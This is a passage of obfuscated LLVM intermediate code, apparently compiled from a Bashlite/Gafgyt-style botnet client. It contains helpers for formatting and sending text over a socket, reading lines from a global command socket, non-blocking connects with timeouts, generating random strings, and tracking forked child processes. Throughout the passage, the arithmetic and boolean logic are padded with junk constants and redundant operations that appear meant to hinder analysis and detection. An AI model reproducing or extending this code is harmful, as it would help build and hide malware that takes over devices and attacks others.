  %76 = add nsw i32 %72, %70
  store i32 %75, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %62, %56
  %78 = load i32, i32* %18, align 4
  %79 = add i32 %78, 4553668
  %80 = add i32 %79, 48
  %81 = sub i32 %80, 4553668
  %82 = add nsw i32 %78, 48
  %83 = trunc i32 %81 to i8
  %84 = load i8*, i8** %17, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 -1
  store i8* %85, i8** %17, align 8
  store i8 %83, i8* %85, align 1
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %21, align 4
  %88 = udiv i32 %87, %86
  store i32 %88, i32* %21, align 4
  br label %53

; <label>:89:                                     ; preds = %53
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %117

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %113

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* %14, align 4
  %97 = xor i32 2, -1
  %98 = xor i32 %96, %97
  %99 = and i32 %98, %96
  %100 = and i32 %96, 2
  %101 = icmp ne i32 %99, 0
  br i1 %101, label %102, label %113

; <label>:102:                                    ; preds = %95
  %103 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %103, i32 45)
  %104 = load i32, i32* %20, align 4
  %105 = add i32 %104, 902241303
  %106 = add i32 %105, 1
  %107 = sub i32 %106, 902241303
  %108 = add nsw i32 %104, 1
  store i32 %107, i32* %20, align 4
  %109 = load i32, i32* %13, align 4
  %110 = sub i32 0, -1
  %111 = sub i32 %109, %110
  %112 = add nsw i32 %109, -1
  store i32 %111, i32* %13, align 4
  br label %116

; <label>:113:                                    ; preds = %95, %92
  %114 = load i8*, i8** %17, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 -1
  store i8* %115, i8** %17, align 8
  store i8 45, i8* %115, align 1
  br label %116

; <label>:116:                                    ; preds = %113, %102
  br label %117

; <label>:117:                                    ; preds = %116, %89
  %118 = load i32, i32* %20, align 4
  %119 = load i8**, i8*** %9, align 8
  %120 = load i8*, i8** %17, align 8
  %121 = load i32, i32* %13, align 4
  %122 = load i32, i32* %14, align 4
  %123 = call i32 @prints(i8** %119, i8* %120, i32 %121, i32 %122)
  %124 = sub i32 %118, 1631607635
  %125 = add i32 %124, %123
  %126 = add i32 %125, 1631607635
  %127 = add nsw i32 %118, %123
  store i32 %126, i32* %8, align 4
  br label %128

; <label>:128:                                    ; preds = %117, %25
  %129 = load i32, i32* %8, align 4
  ret i32 %129
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.471, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %89 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %57
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %126

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, true
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 true, %45
  %47 = xor i1 true, true
  %48 = and i1 %44, %47
  %49 = xor i1 true, true
  %50 = and i1 %49, true
  %51 = and i1 true, %47
  %52 = or i1 %46, %48
  %53 = or i1 %50, %51
  %54 = xor i1 %52, %53
  %55 = xor i1 %44, true
  %56 = zext i1 %54 to i32
  store i32 %56, i32* %3, align 4
  br label %126

; <label>:57:                                     ; preds = %2
  %58 = load i8*, i8** %5, align 8
  %59 = load i8, i8* %58, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %75

; <label>:62:                                     ; preds = %57
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8*, i8** %5, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = call i32 @wildString(i8* %64, i8* %66)
  %68 = icmp ne i32 %67, 0
  %69 = xor i1 %68, true
  %70 = and i1 true, %69
  %71 = xor i1 true, true
  %72 = and i1 %68, %71
  %73 = or i1 %70, %72
  %74 = xor i1 %68, true
  br label %75

; <label>:75:                                     ; preds = %62, %57
  %76 = phi i1 [ false, %57 ], [ %73, %62 ]
  %77 = xor i1 %76, true
  %78 = and i1 true, %77
  %79 = xor i1 true, true
  %80 = and i1 %76, %79
  %81 = xor i1 true, true
  %82 = and i1 %81, true
  %83 = and i1 true, %79
  %84 = or i1 %78, %80
  %85 = or i1 %82, %83
  %86 = xor i1 %84, %85
  %87 = xor i1 %76, true
  %88 = zext i1 %86 to i32
  store i32 %88, i32* %3, align 4
  br label %126

; <label>:89:                                     ; preds = %2
  %90 = load i8*, i8** %4, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = call i32 @toupper(i32 %92) #9
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = call i32 @toupper(i32 %96) #9
  %98 = icmp eq i32 %93, %97
  br i1 %98, label %99, label %117

; <label>:99:                                     ; preds = %89
  %100 = load i8*, i8** %4, align 8
  %101 = getelementptr inbounds i8, i8* %100, i64 1
  %102 = load i8*, i8** %5, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i32 @wildString(i8* %101, i8* %103)
  %105 = icmp ne i32 %104, 0
  %106 = xor i1 %105, true
  %107 = and i1 true, %106
  %108 = xor i1 true, true
  %109 = and i1 %105, %108
  %110 = xor i1 true, true
  %111 = and i1 %110, true
  %112 = and i1 true, %108
  %113 = or i1 %107, %109
  %114 = or i1 %111, %112
  %115 = xor i1 %113, %114
  %116 = xor i1 %105, true
  br label %117

; <label>:117:                                    ; preds = %99, %89
  %118 = phi i1 [ false, %89 ], [ %115, %99 ]
  %119 = xor i1 %118, true
  %120 = and i1 true, %119
  %121 = xor i1 true, true
  %122 = and i1 %118, %121
  %123 = or i1 %120, %122
  %124 = xor i1 %118, true
  %125 = zext i1 %123 to i32
  store i32 %125, i32* %3, align 4
  br label %126

; <label>:126:                                    ; preds = %117, %75, %43, %9
  %127 = load i32, i32* %3, align 4
  ret i32 %127
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %28

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 %12, 162423604
  %14 = add i32 %13, 65
  %15 = add i32 %14, 162423604
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = add i32 %23, -1309860963
  %25 = add i32 %24, 1
  %26 = sub i32 %25, -1309860963
  %27 = add nsw i32 %23, 1
  store i32 %26, i32* %5, align 4
  br label %6

; <label>:28:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add nsw i32 %48, 1
  %54 = call i32 @select(i32 %52, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %54, i32* %12, align 4
  %55 = icmp sle i32 %54, 0
  br i1 %55, label %56, label %102

; <label>:56:                                     ; preds = %33
  br label %57

; <label>:57:                                     ; preds = %95, %56
  %58 = load i32, i32* %13, align 4
  %59 = icmp slt i32 %58, 10
  br i1 %59, label %60, label %101

; <label>:60:                                     ; preds = %57
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

; <label>:63:                                     ; preds = %60
  %64 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %65 = getelementptr inbounds [16 x i64], [16 x i64]* %64, i64 0, i64 0
  %66 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %65) #5, !srcloc !3
  %67 = extractvalue { i64, i64* } %66, 0
  %68 = extractvalue { i64, i64* } %66, 1
  %69 = trunc i64 %67 to i32
  store i32 %69, i32* %14, align 4
  %70 = ptrtoint i64* %68 to i64
  %71 = trunc i64 %70 to i32
  store i32 %71, i32* %15, align 4
  br label %72

; <label>:72:                                     ; preds = %63
  %73 = load i32, i32* %5, align 4
  %74 = srem i32 %73, 64
  %75 = zext i32 %74 to i64
  %76 = shl i64 1, %75
  %77 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %78 = load i32, i32* %5, align 4
  %79 = sdiv i32 %78, 64
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [16 x i64], [16 x i64]* %77, i64 0, i64 %80
  %82 = load i64, i64* %81, align 8
  %83 = and i64 %82, %76
  %84 = xor i64 %82, %76
  %85 = or i64 %83, %84
  %86 = or i64 %82, %76
  store i64 %85, i64* %81, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sub i32 0, %87
  %89 = sub i32 0, 1
  %90 = add i32 %88, %89
  %91 = sub i32 0, %90
  %92 = add nsw i32 %87, 1
  %93 = call i32 @select(i32 %91, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %100

; <label>:95:                                     ; preds = %72
  %96 = load i32, i32* %13, align 4
  %97 = sub i32 0, 1
  %98 = sub i32 %96, %97
  %99 = add nsw i32 %96, 1
  store i32 %98, i32* %13, align 4
  br label %57

; <label>:100:                                    ; preds = %72
  br label %101

; <label>:101:                                    ; preds = %100, %57
  br label %102

; <label>:102:                                    ; preds = %101, %33
  store i32 0, i32* %18, align 4
  %103 = load i8*, i8** %6, align 8
  store i8* %103, i8** %17, align 8
  br label %104

; <label>:104:                                    ; preds = %124, %102
  %105 = load i32, i32* %7, align 4
  %106 = sub i32 0, -1
  %107 = sub i32 %105, %106
  %108 = add nsw i32 %105, -1
  store i32 %107, i32* %7, align 4
  %109 = icmp sgt i32 %105, 1
  br i1 %109, label %110, label %130

; <label>:110:                                    ; preds = %104
  %111 = load i32, i32* @mainCommSock, align 4
  %112 = call i64 @recv(i32 %111, i8* %16, i64 1, i32 0)
  %113 = icmp ne i64 %112, 1
  br i1 %113, label %114, label %116

; <label>:114:                                    ; preds = %110
  %115 = load i8*, i8** %17, align 8
  store i8 0, i8* %115, align 1
  store i32 -1, i32* %4, align 4
  br label %133

; <label>:116:                                    ; preds = %110
  %117 = load i8, i8* %16, align 1
  %118 = load i8*, i8** %17, align 8
  %119 = getelementptr inbounds i8, i8* %118, i32 1
  store i8* %119, i8** %17, align 8
  store i8 %117, i8* %118, align 1
  %120 = load i8, i8* %16, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 10
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %116
  br label %130

; <label>:124:                                    ; preds = %116
  %125 = load i32, i32* %18, align 4
  %126 = sub i32 %125, 2074931146
  %127 = add i32 %126, 1
  %128 = add i32 %127, 2074931146
  %129 = add nsw i32 %125, 1
  store i32 %128, i32* %18, align 4
  br label %104

; <label>:130:                                    ; preds = %123, %104
  %131 = load i8*, i8** %17, align 8
  store i8 0, i8* %131, align 1
  %132 = load i32, i32* %18, align 4
  store i32 %132, i32* %4, align 4
  br label %133

; <label>:133:                                    ; preds = %130, %114
  %134 = load i32, i32* %4, align 4
  ret i32 %134
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #10
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %116

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %100

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #10
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %98

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = and i64 %76, %70
  %78 = xor i64 %76, %70
  %79 = or i64 %77, %78
  %80 = or i64 %76, %70
  store i64 %79, i64* %75, align 8
  %81 = load i32, i32* %6, align 4
  %82 = sub i32 %81, -872896366
  %83 = add i32 %82, 1
  %84 = add i32 %83, -872896366
  %85 = add nsw i32 %81, 1
  %86 = call i32 @select(i32 %84, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %87 = icmp sgt i32 %86, 0
  br i1 %87, label %88, label %96

; <label>:88:                                     ; preds = %66
  store i32 4, i32* %13, align 4
  %89 = load i32, i32* %6, align 4
  %90 = bitcast i32* %14 to i8*
  %91 = call i32 @getsockopt(i32 %89, i32 1, i32 4, i8* %90, i32* %13) #5
  %92 = load i32, i32* %14, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %88
  store i32 0, i32* %5, align 4
  br label %116

; <label>:95:                                     ; preds = %88
  br label %97

; <label>:96:                                     ; preds = %66
  store i32 0, i32* %5, align 4
  br label %116

; <label>:97:                                     ; preds = %95
  br label %99

; <label>:98:                                     ; preds = %48
  store i32 0, i32* %5, align 4
  br label %116

; <label>:99:                                     ; preds = %97
  br label %100

; <label>:100:                                    ; preds = %99, %40
  %101 = load i32, i32* %6, align 4
  %102 = call i32 (i32, i32, ...) @fcntl(i32 %101, i32 3, i8* null)
  %103 = sext i32 %102 to i64
  store i64 %103, i64* %15, align 8
  %104 = load i64, i64* %15, align 8
  %105 = xor i64 %104, -1
  %106 = xor i64 -2049, -1
  %107 = xor i64 2678133983441752633, -1
  %108 = or i64 %105, %106
  %109 = or i64 2678133983441752633, %107
  %110 = xor i64 %108, -1
  %111 = and i64 %110, %109
  %112 = and i64 %104, -2049
  store i64 %111, i64* %15, align 8
  %113 = load i32, i32* %6, align 4
  %114 = load i64, i64* %15, align 8
  %115 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 4, i64 %114)
  store i32 1, i32* %5, align 4
  br label %116

; <label>:116:                                    ; preds = %100, %98, %96, %94, %39
  %117 = load i32, i32* %5, align 4
  ret i32 %117
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %60

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 %11, 4230239679464548019
  %13 = add i64 %12, 1
  %14 = add i64 %13, 4230239679464548019
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = sub i64 0, 1
  %18 = sub i64 %16, %17
  %19 = add i64 %16, 1
  %20 = mul i64 %18, 4
  %21 = call noalias i8* @malloc(i64 %20) #5
  %22 = bitcast i8* %21 to i32*
  store i32* %22, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %23

; <label>:23:                                     ; preds = %41, %10
  %24 = load i32, i32* %4, align 4
  %25 = zext i32 %24 to i64
  %26 = load i64, i64* @numpids, align 8
  %27 = sub i64 0, 1
  %28 = add i64 %26, %27
  %29 = sub i64 %26, 1
  %30 = icmp ult i64 %25, %28
  br i1 %30, label %31, label %47

